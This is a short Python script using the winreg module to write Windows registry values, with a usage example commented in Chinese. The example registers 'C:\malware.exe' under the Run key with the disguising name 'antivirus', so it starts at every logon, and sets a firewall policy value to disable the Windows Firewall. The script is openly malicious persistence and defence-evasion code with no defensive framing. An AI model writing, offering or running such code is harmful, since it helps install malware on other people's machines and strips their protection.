import winreg

def modify_registry_key(key_path, value_name, value_data):
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
    winreg.CloseKey(key)

# 使用範例
modify_registry_key("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "antivirus", "C:\\malware.exe")
modify_registry_key("Software\\Policies\\Microsoft\\WindowsFirewall", "EnableFirewall", "0")